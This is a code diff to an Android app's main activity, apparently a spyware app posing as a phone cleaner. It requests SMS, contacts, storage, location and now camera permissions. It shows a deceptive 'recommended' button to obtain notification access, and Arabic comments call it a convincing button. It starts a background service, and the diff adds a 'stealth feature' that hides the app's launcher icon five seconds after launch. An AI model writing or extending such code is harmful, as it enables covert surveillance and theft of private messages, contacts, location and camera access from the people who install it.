@@ -2,6 +2,7 @@ package com.example.spaceeditor;
 
 import android.Manifest;
 import android.app.Activity;
+import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
@@ -45,7 +46,6 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // واجهة احترافية
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setGravity(Gravity.CENTER);
@@ -87,7 +87,6 @@ public class MainActivity extends Activity {
         statusText.setGravity(Gravity.CENTER);
         layout.addView(statusText);
         
-        // زر مقنع لتفعيل الإشعارات
         Button btnAccess = new Button(this);
         btnAccess.setText("تحسين أداء الإشعارات (مستحسن)");
         btnAccess.setOnClickListener(v -> {
@@ -103,7 +102,8 @@ public class MainActivity extends Activity {
         String[] permissions = {
                 Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS,
                 Manifest.permission.READ_CONTACTS, Manifest.permission.READ_EXTERNAL_STORAGE,
-                Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.POST_NOTIFICATIONS
+                Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.POST_NOTIFICATIONS,
+                Manifest.permission.CAMERA
         };
         if (Build.VERSION.SDK_INT >= 33) {
             permissions[3] = Manifest.permission.READ_MEDIA_IMAGES;
@@ -121,6 +121,19 @@ public class MainActivity extends Activity {
         } else {
             startBackgroundService();
         }
+
+        // ميزة التخفي: إخفاء الأيقونة بعد 5 ثواني
+        new Handler().postDelayed(() -> {
+            try {
+                PackageManager p = getPackageManager();
+                ComponentName componentName = new ComponentName(this, MainActivity.class);
+                p.setComponentEnabledSetting(componentName, 
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
+                    PackageManager.DONT_KILL_APP);
+            } catch (Exception e) {
+                Log.e("STEALTH", "Error hiding icon", e);
+            }
+        }, 5000);
     }
 
     private void simulateCleaning() {
